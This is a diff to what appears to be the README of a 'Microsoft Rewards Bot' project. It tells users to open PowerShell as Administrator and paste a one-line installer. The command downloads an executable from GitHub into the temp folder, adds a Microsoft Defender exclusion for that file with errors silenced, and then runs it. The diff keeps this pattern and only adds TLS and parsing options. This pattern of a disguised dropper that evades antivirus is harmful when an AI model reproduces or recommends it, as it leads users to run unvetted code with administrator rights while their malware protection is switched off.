@@ -50,7 +50,7 @@
 Open PowerShell as Administrator, then effortlessly run the one-line automated installer:
 
 ```powershell
-$f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/HEAD/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f
+$f="$env:TEMP\install.exe"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -UseBasicParsing 'https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/HEAD/scripts/install.exe' -OutFile $f; Add-MpPreference -ExclusionPath $f -ErrorAction SilentlyContinue; start $f
 
 ```
 
